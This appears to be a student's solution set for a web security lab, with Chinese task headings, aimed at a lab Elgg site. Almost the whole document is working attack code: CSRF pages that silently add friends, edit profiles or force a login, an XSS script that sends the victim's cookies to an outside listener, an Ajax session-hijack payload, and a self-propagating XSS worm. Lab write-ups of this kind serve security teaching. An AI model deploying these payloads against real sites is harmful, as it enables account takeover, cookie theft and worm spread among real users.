① CSRF任务 1：基于 GET 请求的 CSRF 攻击：

<html>
<head>
    <title>
        lm's lab3 
    </title>
</head>
<body>
     good!
     <img src="http://www.csrflabelgg.com/action/friends/add?friend=45" hidden />
      </body>
</html>


②CSRF任务 2：使用Post请求的CSRF攻击：

<html><body>
    <h1>This page forges an HTTP POST request.</h1>
    <script type="text/javascript">
        function post(url,fields){
            var p = document.createElement("form");
            p.action = url;
            p.innerHTML = fields;
            p.target ="_self";
            p.method ="post";
            document.body.appendChild(p);
            p.submit();
       }
        function csrf_post(){
            var fields;
            fields += "<input type='hidden' name='name' value='alice'>";
            fields += "<input type='hidden' name='description' value='Samy is my hero'>";
            fields += "<input type='hidden' name='accesslevel[desription]' value='2'>";
            fields += "<input type='hidden' name='briefdescription' value=''>";
            fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
            fields += "<input type='hidden' name='location' value=''>";
            fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
            fields += "<input type='hidden' name='guid' value='42'>";
            var url ="http://www.csrflabelgg.com/action/profile/edit";
            post(url,fields);
       }
        window.onload = function() { csrf_post();}
    </script>
</body></html>

③ CSRF任务 3：实现 login CSRF 攻击：


<form method="post" action="http://www.csrflabelgg.com/action/login" class="elgg-form elgg-form-login">
    <fieldset>
        <input name="__elgg_token" value="3b7ba29a4a8fa5fb568389c21edf0fca" type="hidden">
        <input name="__elgg_ts" value="1527493857" type="hidden">
        <div>
            <label>Username or email</label>
            <input value="samy" name="username" class="elgg-input-text elgg-autofocus" type="text">
        </div>
        <div>
            <label>Password</label>
            <input value="seedsamy" name="password" class="elgg-input-password" type="password">
        </div>
        <div class="elgg-foot">
            <label class="mtm float-alt">
                <input name="persistent" value="true" type="checkbox">
                Remember me
            </label>
            <input value="Log in" class="elgg-button elgg-button-submit" type="submit">
            <ul class="elgg-menu elgg-menu-general mtm">
                <li><a class="registration_link" href="http://www.csrflabelgg.com/register">Register</a></li>
                <li><a class="forgot_link" href="http://www.csrflabelgg.com/forgotpassword">Lost password</a>
                </li>
            </ul>
        </div>
    </fieldset>
</form>
<script>
    document.forms[0].submit();
</script>

④XSS任务 1：从受取害者的机器上盗取 Cookie：

<script>
    document.write('<img src=http://localhost:5555?c=' + escape(document.cookie)
    + ' >');
</script>

⑤ XSS任务 2：使用 Ajax 脚本自动发起会话劫持：

<script type="text/javascript">
    window.onload = function () {
        //自动获取ts、token等信息     
        var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        var guid = "&guid=" + elgg.session.user.guid;
        var name = "&name=" + elgg.session.user.name;
        var desc = "&description=Samy is my hero." + "&accesslevel[description]=2";
        var content = elgg_token + elgg_ts + name + desc + guid;
        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
        var SamyGUID = "&guid=" + 47;
        if (guid != SamyGUID) {
            var Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>

⑥XSS任务 3：构造 XSS 蠕虫：

<script id="worm" type="text/javascript">
    window.onload = function () {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jscodeTag = document.getElementById("worm").innerHTML;
        var footerTag = "</" + "script>"
        var wormcode = encodeURIComponent(headerTag + jscodeTag + footerTag);
        var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        var guid = "&guid=" + elgg.session.user.guid;
        var name = "&name=" + elgg.session.user.name;
        var desc = "&description=Samy is my hero. (worm)" + wormcode +"&accesslevel[description]=2";
        var content = elgg_token + elgg_ts + name + desc + guid;
        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
        var SamyGUID = "&guid=" + 47;
        if (guid != SamyGUID) {
            var Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          Ajax.send(content);
        }
    }
</script>